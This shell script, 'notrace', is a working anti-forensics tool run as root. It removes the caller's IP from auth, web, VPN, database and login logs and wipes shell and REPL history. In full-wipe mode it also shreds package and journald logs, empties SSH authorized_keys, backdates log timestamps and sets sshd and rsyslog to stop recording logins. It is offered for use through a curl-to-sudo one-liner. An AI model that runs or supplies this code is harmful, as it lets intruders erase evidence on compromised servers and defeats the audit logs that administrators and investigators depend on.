#!/bin/sh
set -e

VERSION="1.1.0"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()   { printf "${GREEN}[✓]${NC} %s\n" "$1"; }
warn()   { printf "${YELLOW}[!]${NC} %s\n" "$1"; }
error()  { printf "${RED}[✗]${NC} %s\n" "$1"; exit 1; }
header() { printf "\n${CYAN}=== %s ===${NC}\n" "$1"; }

usage() {
    cat <<EOF
notrace v${VERSION} - Server trace cleaner

Usage: sudo sh notrace.sh [OPTION]

Options:
  --self    Clean only YOUR access traces (auto-detect from SSH_CLIENT)
  --all     Complete wipe: all logs, all history, block future logging
  --help    Show this help message

Examples:
  curl -fsSL URL/notrace.sh | sudo sh
  curl -fsSL URL/notrace.sh | sudo sh -s -- --all
EOF
    exit 0
}

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        error "This script must be run as root (use sudo)"
    fi
}

detect_os() {
    OS=""
    OS_FAMILY=""
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS="$ID"
        OS_LIKE="${ID_LIKE:-}"
    fi
    if [ -z "$OS" ]; then
        OS=$(uname -s 2>/dev/null || echo "unknown")
    fi

    case "$OS" in
        ubuntu|debian|linuxmint|pop|elementary|kali|neon|deepin|uos)
            OS_FAMILY="debian" ;;
        centos|rhel|fedora|rocky|almalinux|ol|amzn|oracle)
            OS_FAMILY="rhel" ;;
        arch|manjaro|endeavouros|artix|archarm|garuda)
            OS_FAMILY="arch" ;;
        suse|opensuse*|sles|opensuse-tumbleweed)
            OS_FAMILY="suse" ;;
        alpine)
            OS_FAMILY="alpine" ;;
        gentoo|funtoo)
            OS_FAMILY="gentoo" ;;
        void)
            OS_FAMILY="void" ;;
        slackware)
            OS_FAMILY="slackware" ;;
        *)
            if [ -n "$OS_LIKE" ]; then
                case "$OS_LIKE" in
                    *debian*)  OS_FAMILY="debian" ;;
                    *rhel*|*fedora*|*centos*) OS_FAMILY="rhel" ;;
                    *arch*)    OS_FAMILY="arch" ;;
                    *suse*)    OS_FAMILY="suse" ;;
                    *)         OS_FAMILY="unknown" ;;
                esac
            else
                OS_FAMILY="unknown"
            fi ;;
    esac

    info "Detected OS: $OS (family: ${OS_FAMILY:-unknown})"
}

# ── Helpers ──────────────────────────────────

# These log dirs are checked by both modes
get_log_search_dirs() {
    cat <<DIRS
/var/log/nginx
/var/log/httpd
/var/log/apache2
/var/log/apache
/var/log/caddy
/var/log/traefik
/var/log/openvpn
/var/log/wireguard
/var/log/strongswan
/var/log/ipsec
/var/log/ocserv
/var/log/vsftpd
/var/log/proftpd
/var/log/samba
/var/log/mysql
/var/log/mariadb
/var/log/postgresql
/var/log/postgres
/var/log/pgsql
/var/log/mongodb
/var/log/mongod
/var/log/redis
/var/log/fail2ban
/var/log/audit
/var/log/aliyun
/var/log/amazon
/var/log/aws
/var/log/azure
/var/log/google
/var/log/tencent
/var/log/ufw
/var/log/firewalld
/var/log/iptables
/var/log/portage
DIRS
}

truncate_file() {
    file="$1"
    [ -f "$file" ] || return 0
    : > "$file" 2>/dev/null || true
}

shred_file() {
    file="$1"
    [ -f "$file" ] || return 0
    if command -v shred >/dev/null 2>&1; then
        shred -fzu "$file" 2>/dev/null || rm -f "$file" 2>/dev/null || true
    elif command -v dd >/dev/null 2>&1; then
        dd if=/dev/zero of="$file" bs=1M 2>/dev/null || true
        rm -f "$file" 2>/dev/null || true
    else
        : > "$file" 2>/dev/null || true
        rm -f "$file" 2>/dev/null || true
    fi
}

remove_ip_lines() {
    file="$1"
    ip="$2"
    [ -f "$file" ] || return 0
    tmp=$(mktemp 2>/dev/null || mktemp -t notrace.XXXXXX)
    if grep -vF "$ip" "$file" > "$tmp" 2>/dev/null; then
        if [ -s "$tmp" ]; then
            cat "$tmp" > "$file" 2>/dev/null || true
        else
            : > "$file" 2>/dev/null || true
        fi
    fi
    rm -f "$tmp" 2>/dev/null || true
}

filter_wtmp_ip() {
    wfile="$1"
    ip="$2"
    [ -f "$wfile" ] || return 0
    if command -v utmpdump >/dev/null 2>&1; then
        tmp=$(mktemp 2>/dev/null || mktemp -t notrace.XXXXXX)
        utmpdump "$wfile" 2>/dev/null | grep -vF "$ip" > "$tmp" 2>/dev/null || true
        if [ -s "$tmp" ]; then
            utmpdump -r < "$tmp" > "$wfile" 2>/dev/null || : > "$wfile" 2>/dev/null || true
        else
            : > "$wfile" 2>/dev/null || true
        fi
        rm -f "$tmp" 2>/dev/null || true
    else
        : > "$wfile" 2>/dev/null || true
    fi
}

detect_client_ip() {
    ip=""
    if [ -n "${SSH_CLIENT:-}" ]; then
        ip=$(echo "$SSH_CLIENT" | awk '{print $1}')
    elif [ -n "${SSH_CONNECTION:-}" ]; then
        ip=$(echo "$SSH_CONNECTION" | awk '{print $1}')
    elif command -v who >/dev/null 2>&1; then
        ip=$(who -m 2>/dev/null | awk '{print $NF}' | tr -d '()')
    fi
    echo "$ip"
}

clear_history_files() {
    for home_dir in /root /home/*; do
        [ -d "$home_dir" ] || continue
        for hf in .bash_history .sh_history .zsh_history \
                  .mysql_history .psql_history .pg_history \
                  .python_history .python_repl_history \
                  .node_repl_history .rediscli_history \
                  .mongosh_history .sqlite_history \
                  .viminfo .lesshst .nano_history .zsh_sessions \
                  .irb_history .pry_history .Rhistory .Rapp.history; do
            [ -f "$home_dir/$hf" ] && : > "$home_dir/$hf" 2>/dev/null || true
        done
    done
    if command -v history >/dev/null 2>&1; then
        history -c 2>/dev/null || true
    fi
    : > /root/.bash_history 2>/dev/null || true
    export HISTFILE=/dev/null
}

clear_app_caches() {
    for home_dir in /root /home/*; do
        [ -d "$home_dir" ] || continue
        [ -f "$home_dir/.pip/pip.log" ] && shred_file "$home_dir/.pip/pip.log"
        [ -d "$home_dir/.npm/_logs" ] && rm -rf "$home_dir/.npm/_logs" 2>/dev/null || true
        [ -d "$home_dir/.npm/_cacache" ] && rm -rf "$home_dir/.npm/_cacache" 2>/dev/null || true
        [ -f "$home_dir/.wget-hsts" ] && shred_file "$home_dir/.wget-hsts"
        [ -f "$home_dir/.curlrc" ] && shred_file "$home_dir/.curlrc"
    done
}

wipe_log_dir() {
    dir="$1"
    [ -d "$dir" ] || return 0
    for f in "$dir"/*; do
        [ -f "$f" ] && truncate_file "$f"
    done
}

# ──────────────────────────────────────────────
#  --self
# ──────────────────────────────────────────────
self_clean() {
    header "Mode: Self-clean (your traces only)"

    MY_IP=$(detect_client_ip)
    if [ -z "$MY_IP" ]; then
        warn "Could not auto-detect your IP via SSH_CLIENT or who -m"
        warn "Skipping IP-specific log cleanup."
    else
        info "Detected your IP: $MY_IP"
    fi

    if [ -n "$MY_IP" ]; then
        # Auth logs by OS family
        case "$OS_FAMILY" in
            debian)
                for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
                    remove_ip_lines "$f" "$MY_IP"
                done ;;
            rhel|amzn)
                for f in /var/log/secure /var/log/secure-*; do
                    remove_ip_lines "$f" "$MY_IP"
                done ;;
            alpine|gentoo|void)
                for f in /var/log/auth.log /var/log/auth.log.* /var/log/secure /var/log/secure-*; do
                    remove_ip_lines "$f" "$MY_IP"
                done ;;
        esac
        info "Auth logs cleaned"

        # Web server logs
        for dir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
                   /var/log/caddy /var/log/traefik; do
            if [ -d "$dir" ]; then
                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
            fi
        done
        info "Web server logs cleaned"

        # VPN logs
        for dir in /var/log/openvpn /var/log/wireguard /var/log/strongswan \
                   /var/log/ipsec /var/log/ocserv; do
            if [ -d "$dir" ]; then
                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
            fi
        done
        info "VPN logs cleaned"

        # FTP logs
        for dir in /var/log/vsftpd /var/log/proftpd; do
            if [ -d "$dir" ]; then
                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
            fi
        done
        [ -f /var/log/xferlog ] && remove_ip_lines /var/log/xferlog "$MY_IP"
        [ -f /var/log/pureftpd.log ] && remove_ip_lines /var/log/pureftpd.log "$MY_IP"

        # Samba logs
        if [ -d /var/log/samba ]; then
            for f in /var/log/samba/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
        fi

        # System text logs
        for f in /var/log/messages /var/log/syslog /var/log/kern.log /var/log/debug \
                 /var/log/daemon.log /var/log/user.log /var/log/mail.log \
                 /var/log/mail.err /var/log/mail.warn /var/log/cron.log \
                 /var/log/boot.log /var/log/cloud-init.log /var/log/cloud-init-output.log \
                 /var/log/firewalld /var/log/ufw.log; do
            remove_ip_lines "$f" "$MY_IP"
        done
        info "System logs cleaned"

        # Binary login records
        filter_wtmp_ip /var/log/wtmp "$MY_IP"
        filter_wtmp_ip /var/log/btmp "$MY_IP"
        filter_wtmp_ip /var/log/lastlog "$MY_IP"
        command -v faillog >/dev/null 2>&1 && faillog -r 2>/dev/null || true
        info "Login records cleaned"

        # DB logs
        for dir in /var/log/mysql /var/log/mariadb /var/log/postgresql \
                   /var/log/postgres /var/log/pgsql /var/log/mongodb \
                   /var/log/mongod /var/log/redis; do
            if [ -d "$dir" ]; then
                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
            fi
        done
        info "Database logs cleaned"

        # Cloud agent logs
        for f in /var/log/aliyun* /var/log/aws* /var/log/amazon/* /var/log/waagent.log \
                 /var/log/azure/* /var/log/google* /var/log/tencent* /var/log/oracle-cloud-agent/*; do
            [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"
        done
    fi

    clear_history_files
    if [ -n "$MY_IP" ]; then
        for home_dir in /home/*; do
            [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "$MY_IP" || true
        done
    fi
    info "History files cleaned"

    info "Self-clean complete! Your traces have been removed."
}

# ──────────────────────────────────────────────
#  --all
# ──────────────────────────────────────────────
total_wipe() {
    header "Mode: Total wipe (complete system cleanse)"

    # ── [1] System logs ──
    header "[1/5] Clearing system logs"

    for f in /var/log/messages /var/log/messages-* \
             /var/log/syslog /var/log/syslog-* \
             /var/log/kern.log /var/log/kern.log.* \
             /var/log/debug /var/log/debug-* \
             /var/log/daemon.log /var/log/daemon.log.* \
             /var/log/user.log /var/log/user.log.* \
             /var/log/mail.log /var/log/mail.log.* \
             /var/log/mail.err /var/log/mail.warn \
             /var/log/cron.log /var/log/cron-* \
             /var/log/boot.log /var/log/boot.log.* \
             /var/log/dmesg /var/log/dmesg.* \
             /var/log/faillog /var/log/lastlog \
             /var/log/wtmp /var/log/wtmp-* \
             /var/log/btmp /var/log/btmp-*; do
        truncate_file "$f"
    done

    case "$OS_FAMILY" in
        debian|alpine|gentoo|void)
            for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
                truncate_file "$f"
            done ;;
        rhel|amzn)
            for f in /var/log/secure /var/log/secure-*; do
                truncate_file "$f"
            done ;;
    esac

    # Wipe all known log directories
    for dir in $(get_log_search_dirs); do
        wipe_log_dir "$dir"
    done

    # Also search for any .log files in /var/log that might be custom apps
    find /var/log -maxdepth 2 -type f -name "*.log" 2>/dev/null | while read -r f; do
        truncate_file "$f"
    done
    info "System logs cleared"

    # Docker
    if command -v docker >/dev/null 2>&1; then
        docker ps -q 2>/dev/null | while read -r cid; do
            logpath=$(docker inspect --format='{{.LogPath}}' "$cid" 2>/dev/null) || continue
            truncate -s 0 "$logpath" 2>/dev/null || true
        done
        info "Docker logs cleared"
    fi

    # Journald
    if command -v journalctl >/dev/null 2>&1; then
        journalctl --rotate 2>/dev/null || true
        journalctl --vacuum-size=0 --vacuum-time=1s 2>/dev/null || true
        info "Journald logs cleared"
    fi

    # ── [2] Package manager logs ──
    header "[2/5] Clearing installation records"

    case "$OS_FAMILY" in
        debian)
            for f in /var/log/dpkg.log /var/log/dpkg.log.* /var/log/apt/history.log \
                     /var/log/apt/history.log.* /var/log/apt/term.log /var/log/apt/term.log.* \
                     /var/log/bootstrap.log; do
                shred_file "$f"
            done
            rm -rf /var/log/installer 2>/dev/null || true ;;
        rhel)
            for f in /var/log/yum.log /var/log/yum.log.* /var/log/dnf.log /var/log/dnf.log.* \
                     /var/log/dnf.rpm.log /var/log/dnf.rpm.log.* /var/log/dnf.transaction.log \
                     /var/log/dnf.transaction.log.*; do
                shred_file "$f"
            done ;;
        arch)
            for f in /var/log/pacman.log /var/log/pacman.log.*; do
                shred_file "$f"
            done ;;
        suse)
            for f in /var/log/zypper.log /var/log/zypper.log.* /var/log/zypp/history \
                     /var/log/zypp/history.*; do
                shred_file "$f"
            done ;;
        alpine)
            for f in /var/log/apk/*; do
                [ -f "$f" ] && shred_file "$f"
            done ;;
        gentoo)
            for f in /var/log/emerge.log /var/log/emerge-fetch.log; do
                shred_file "$f"
            done
            rm -rf /var/log/portage 2>/dev/null || true ;;
    esac
    info "Package manager logs removed"

    clear_app_caches
    info "User package caches cleared"

    # ── [3] History ──
    header "[3/5] Clearing command and application history"
    clear_history_files

    for home_dir in /root /home/*; do
        [ -d "$home_dir" ] || continue
        [ -f "$home_dir/.ssh/known_hosts" ] && : > "$home_dir/.ssh/known_hosts" 2>/dev/null || true
        [ -f "$home_dir/.ssh/authorized_keys" ] && : > "$home_dir/.ssh/authorized_keys" 2>/dev/null || true
    done
    info "SSH traces cleared"

    # ── [4] Timestamp spoofing ──
    header "[4/5] Spoofing timestamps"

    touch_cmd="touch -d \"3 days ago\""
    if ! touch -d "3 days ago" /tmp/.notrace_test 2>/dev/null; then
        touch_cmd="touch -t $(date -d '3 days ago' '+%Y%m%d%H%M.%S' 2>/dev/null || echo '200001010000.00')"
        # fallback: no date manipulation
        if [ "$touch_cmd" = 'touch -t 200001010000.00' ]; then
            touch_cmd="touch"
        fi
    fi
    rm -f /tmp/.notrace_test 2>/dev/null || true

    for dir in /var/log /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
               /var/log/openvpn /var/log/wireguard /var/log/audit /var/log/apt \
               /var/log/zypp /var/log/mysql /var/log/mariadb /var/log/postgresql \
               /var/log/mongodb /var/log/redis; do
        if [ -d "$dir" ]; then
            find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
        fi
    done
    info "Timestamps spoofed (appear as normal log rotation)"

    # ── [5] Block future logging ──
    header "[5/5] Blocking future logging"

    # SSH: LogLevel QUIET
    if [ -f /etc/ssh/sshd_config ]; then
        if grep -q "^LogLevel" /etc/ssh/sshd_config 2>/dev/null; then
            sed -i 's/^LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config 2>/dev/null || true
        else
            echo "LogLevel QUIET" >> /etc/ssh/sshd_config 2>/dev/null || true
        fi
        info "SSH LogLevel set to QUIET"
    fi

    # Rsyslog: suppress auth logging
    if command -v rsyslogd >/dev/null 2>&1 && [ -d /etc/rsyslog.d ]; then
        cat > /etc/rsyslog.d/00-notrace.conf <<'RSCONF' 2>/dev/null || true
authpriv.none  /var/log/auth.log
authpriv.*     ~
RSCONF
        if command -v systemctl >/dev/null 2>&1; then
            systemctl restart rsyslog 2>/dev/null || true
        elif command -v service >/dev/null 2>&1; then
            service rsyslog restart 2>/dev/null || true
        elif command -v rc-service >/dev/null 2>&1; then
            rc-service rsyslog restart 2>/dev/null || true
        fi
        info "Rsyslog configured to suppress auth logging"
    fi

    # Busybox syslogd (Alpine)
    if command -v syslogd >/dev/null 2>&1 && [ -f /etc/syslog.conf ]; then
        echo "auth.* /dev/null" >> /etc/syslog.conf 2>/dev/null || true
        if command -v rc-service >/dev/null 2>&1; then
            rc-service syslogd restart 2>/dev/null || true
        fi
        info "Busybox syslogd configured to suppress auth logging"
    fi

    # Disable command history system-wide
    for rcfile in /etc/profile /etc/bashrc /etc/bash.bashrc /etc/zsh/zshrc \
                  /root/.bashrc /root/.zshrc; do
        if [ -f "$rcfile" ] && ! grep -q "HISTSIZE=0" "$rcfile" 2>/dev/null; then
            {
                echo ""
                echo "# notrace: disable command history"
                echo "export HISTSIZE=0"
                echo "export HISTFILESIZE=0"
            } >> "$rcfile" 2>/dev/null || true
        fi
    done
    info "Command history disabled system-wide"

    info "Total wipe complete!"
    warn "SSH changes require: systemctl restart sshd (safe to run later when disconnected)"
}

# ══════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════
main() {
    printf "${CYAN}╔══════════════════════╗${NC}\n"
    printf "${CYAN}║   notrace v%s   ║${NC}\n" "$VERSION"
    printf "${CYAN}╚══════════════════════╝${NC}\n"

    case "${1:-}" in
        --help|-h)
            usage ;;
    esac

    check_root
    detect_os

    case "${1:-}" in
        --all|-a)
            total_wipe ;;
        --self|-s|"")
            self_clean ;;
        *)
            error "Unknown option: $1. Use --help for usage." ;;
    esac
}

main "$@"
